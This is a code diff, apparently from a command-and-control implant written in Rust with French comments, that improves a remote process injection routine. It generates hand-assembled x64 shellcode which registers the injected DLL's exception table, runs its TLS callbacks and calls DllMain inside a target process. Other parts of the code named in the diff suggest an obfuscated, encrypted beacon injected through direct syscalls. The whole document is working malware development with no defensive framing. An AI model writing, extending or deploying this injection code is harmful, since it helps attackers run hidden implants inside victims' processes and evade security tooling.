@@ -38,7 +38,10 @@ macro_rules! debug_eprintln {
 // IMPORTS
 // ============================================================
 
-use c2_common::pe::{PeParser, IMAGE_ORDINAL_FLAG64};
+use c2_common::pe::{
+    PeParser, TlsDirectory64, IMAGE_DIRECTORY_ENTRY_EXCEPTION, IMAGE_DIRECTORY_ENTRY_TLS,
+    IMAGE_ORDINAL_FLAG64,
+};
 use c2_common::{obf_str, syscall};
 
 use libc::c_void;
@@ -49,7 +52,7 @@ use ntapi::ntapi_base::CLIENT_ID;
 use ntapi::ntexapi::{SystemProcessInformation, PSYSTEM_PROCESS_INFORMATION};
 use winapi::shared::ntdef::{HANDLE, NTSTATUS, NULL, OBJECT_ATTRIBUTES};
 use winapi::shared::ntstatus::STATUS_SUCCESS;
-use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
+use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
 
 // ============================================================
 // CONSTANTES
@@ -89,38 +92,129 @@ fn decrypt_beacon() -> Vec<u8> {
 // FONCTIONS HELPER
 // ============================================================
 
-/// Génère un shellcode trampoline pour appeler DllMain
-/// Arguments DllMain: (hinstDLL, fdwReason, lpvReserved)
-/// RCX est passé par NtCreateThreadEx (lpParameter = BaseAddress)
-fn generate_trampoline(entry_point_rva: u32) -> Vec<u8> {
-    let mut shellcode = Vec::new();
+/// Infos extraites du PE nécessaires au trampoline
+struct TrampolineInfo {
+    entry_point_rva: u32,
+    /// .pdata RVA et nombre d'entrées RUNTIME_FUNCTION (12 bytes chacune)
+    pdata_rva: u32,
+    pdata_entry_count: u32,
+    /// RVA du tableau de callbacks TLS (NULL-terminated array of u64) — 0 si aucun
+    tls_callbacks_rva: u32,
+    /// Adresse absolue de RtlAddFunctionTable (même adresse dans tous les process)
+    rtl_add_function_table_addr: u64,
+}
 
-    // 1. mov edx, 1 (DLL_PROCESS_ATTACH)
-    shellcode.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]);
+/// Génère un shellcode trampoline étendu:
+/// 1. RtlAddFunctionTable — enregistre la table d'exceptions x64 (SEH)
+/// 2. TLS callbacks — initialise le Thread Local Storage
+/// 3. DllMain(hinstDLL, DLL_PROCESS_ATTACH, NULL)
+///
+/// RCX = BaseAddress (passé par NtCreateThreadEx lpParameter)
+fn generate_trampoline(info: &TrampolineInfo) -> Vec<u8> {
+    let mut sc = Vec::new();
 
-    // 2. xor r8d, r8d (lpvReserved = NULL)
-    shellcode.extend_from_slice(&[0x45, 0x31, 0xC0]);
+    // === Prologue ===
+    // Sauvegarder les registres non-volatiles
+    sc.push(0x53); // push rbx
+    sc.push(0x41); sc.push(0x54); // push r12
 
-    // 3. mov rax, rcx (rax = BaseAddress)
-    shellcode.extend_from_slice(&[0x48, 0x89, 0xC8]);
+    // Shadow space + alignment (2 pushes = RSP mod16=8, sub 0x28 → mod16=0)
+    sc.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
 
-    // 4. add rax, entry_point_rva (rax = EntryPoint)
-    shellcode.extend_from_slice(&[0x48, 0x05]);
-    shellcode.extend_from_slice(&entry_point_rva.to_le_bytes());
+    // Sauver BaseAddress dans rbx
+    sc.extend_from_slice(&[0x48, 0x89, 0xCB]); // mov rbx, rcx
 
-    // 5. sub rsp, 0x28 (Align stack + Shadow space)
-    shellcode.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);
+    // ============================================================
+    // PART 1: RtlAddFunctionTable(base+pdata_rva, count, base)
+    // Nécessaire pour le SEH x64 — sans ça toute exception crash le process
+    // ============================================================
+    if info.pdata_rva != 0 && info.pdata_entry_count != 0 && info.rtl_add_function_table_addr != 0
+    {
+        // lea rcx, [rbx + pdata_rva]  (FunctionTable)
+        sc.extend_from_slice(&[0x48, 0x8D, 0x8B]);
+        sc.extend_from_slice(&info.pdata_rva.to_le_bytes());
 
-    // 6. call rax
-    shellcode.extend_from_slice(&[0xFF, 0xD0]);
+        // mov edx, entry_count  (NumberOfEntries)
+        sc.extend_from_slice(&[0xBA]);
+        sc.extend_from_slice(&info.pdata_entry_count.to_le_bytes());
 
-    // 7. add rsp, 0x28
-    shellcode.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);
+        // mov r8, rbx  (BaseAddress)
+        sc.extend_from_slice(&[0x49, 0x89, 0xD8]);
 
-    // 8. ret
-    shellcode.push(0xC3);
+        // mov rax, imm64  (RtlAddFunctionTable)
+        sc.extend_from_slice(&[0x48, 0xB8]);
+        sc.extend_from_slice(&info.rtl_add_function_table_addr.to_le_bytes());
 
-    shellcode
+        // call rax
+        sc.extend_from_slice(&[0xFF, 0xD0]);
+    }
+
+    // ============================================================
+    // PART 2: TLS Callbacks (NULL-terminated array of function pointers)
+    // Le runtime Rust utilise le TLS — sans init, crash garanti
+    // ============================================================
+    if info.tls_callbacks_rva != 0 {
+        // lea r12, [rbx + tls_callbacks_rva]
+        sc.extend_from_slice(&[0x4C, 0x8D, 0xA3]);
+        sc.extend_from_slice(&info.tls_callbacks_rva.to_le_bytes());
+
+        // === loop_top ===
+        let loop_top = sc.len();
+
+        // mov rax, [r12]  (load callback address)
+        sc.extend_from_slice(&[0x49, 0x8B, 0x04, 0x24]);
+
+        // test rax, rax  (NULL = end of array)
+        sc.extend_from_slice(&[0x48, 0x85, 0xC0]);
+
+        // jz end_tls (short jump, patch later)
+        sc.extend_from_slice(&[0x74, 0x00]);
+        let jz_patch_pos = sc.len() - 1;
+
+        // TLS callback signature: fn(DllHandle, Reason, Reserved)
+        // mov rcx, rbx  (DllHandle = BaseAddress)
+        sc.extend_from_slice(&[0x48, 0x89, 0xD9]);
+        // mov edx, 1  (DLL_PROCESS_ATTACH)
+        sc.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]);
+        // xor r8d, r8d  (Reserved = NULL)
+        sc.extend_from_slice(&[0x45, 0x31, 0xC0]);
+        // call rax
+        sc.extend_from_slice(&[0xFF, 0xD0]);
+
+        // add r12, 8  (next callback pointer)
+        sc.extend_from_slice(&[0x49, 0x83, 0xC4, 0x08]);
+
+        // jmp loop_top (short jump back)
+        let jmp_offset = (loop_top as isize - (sc.len() as isize + 2)) as i8;
+        sc.extend_from_slice(&[0xEB, jmp_offset as u8]);
+
+        // === end_tls ===
+        let end_tls_offset = (sc.len() - (jz_patch_pos + 1)) as u8;
+        sc[jz_patch_pos] = end_tls_offset;
+    }
+
+    // ============================================================
+    // PART 3: DllMain(hinstDLL, DLL_PROCESS_ATTACH, NULL)
+    // ============================================================
+    // mov rcx, rbx  (hinstDLL = BaseAddress)
+    sc.extend_from_slice(&[0x48, 0x89, 0xD9]);
+    // mov edx, 1  (DLL_PROCESS_ATTACH)
+    sc.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]);
+    // xor r8d, r8d  (lpvReserved = NULL)
+    sc.extend_from_slice(&[0x45, 0x31, 0xC0]);
+    // lea rax, [rbx + entry_point_rva]
+    sc.extend_from_slice(&[0x48, 0x8D, 0x83]);
+    sc.extend_from_slice(&info.entry_point_rva.to_le_bytes());
+    // call rax
+    sc.extend_from_slice(&[0xFF, 0xD0]);
+
+    // === Epilogue ===
+    sc.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
+    sc.push(0x41); sc.push(0x5C); // pop r12
+    sc.push(0x5B); // pop rbx
+    sc.push(0xC3); // ret
+
+    sc
 }
 
 /// Trouve le PID d'un processus par son nom
@@ -425,7 +519,60 @@ fn inject_pe_remote(target_pid: u32, dll_bytes: &[u8]) -> Result<(), String> {
         // =====================================================
         debug_println!("\n[STEP 6] Allocating & Writing Trampoline");
 
-        let trampoline_code = generate_trampoline(pe.entry_point_rva());
+        // Extraire les infos du PE pour le trampoline étendu
+        let (pdata_rva, pdata_entry_count) =
+            if let Some(exc_dir) = pe.data_directory(IMAGE_DIRECTORY_ENTRY_EXCEPTION) {
+                if exc_dir.virtual_address != 0 && exc_dir.size != 0 {
+                    // RUNTIME_FUNCTION = 12 bytes (BeginAddress + EndAddress + UnwindData)
+                    (exc_dir.virtual_address, exc_dir.size / 12)
+                } else {
+                    (0, 0)
+                }
+            } else {
+                (0, 0)
+            };
+
+        let tls_callbacks_rva =
+            if let Some(tls_entry) = pe.data_directory(IMAGE_DIRECTORY_ENTRY_TLS) {
+                if tls_entry.virtual_address != 0 && tls_entry.size != 0 {
+                    pe.read_struct_at_rva::<TlsDirectory64>(tls_entry.virtual_address)
+                        .filter(|tls| tls.address_of_callbacks != 0)
+                        .map(|tls| {
+                            (tls.address_of_callbacks.wrapping_sub(pe.image_base())) as u32
+                        })
+                        .unwrap_or(0)
+                } else {
+                    0
+                }
+            } else {
+                0
+            };
+
+        // RtlAddFunctionTable est dans ntdll — même adresse dans tous les process (ASLR system-wide)
+        let rtl_add_function_table_addr = {
+            let ntdll = GetModuleHandleA(c"ntdll.dll".as_ptr());
+            if !ntdll.is_null() {
+                GetProcAddress(ntdll, c"RtlAddFunctionTable".as_ptr()) as u64
+            } else {
+                0
+            }
+        };
+
+        debug_println!(
+            "[*] Trampoline info: pdata_rva=0x{:X} entries={} tls_rva=0x{:X} RtlAddFT=0x{:X}",
+            pdata_rva,
+            pdata_entry_count,
+            tls_callbacks_rva,
+            rtl_add_function_table_addr
+        );
+
+        let trampoline_code = generate_trampoline(&TrampolineInfo {
+            entry_point_rva: pe.entry_point_rva(),
+            pdata_rva,
+            pdata_entry_count,
+            tls_callbacks_rva,
+            rtl_add_function_table_addr,
+        });
         let mut trampoline_base: *mut c_void = null_mut();
         let mut trampoline_size: usize = trampoline_code.len(); // Taille exacte ou page ?
                                                                 // NtAllocateVirtualMemory arrondit à la page, donc c'est OK
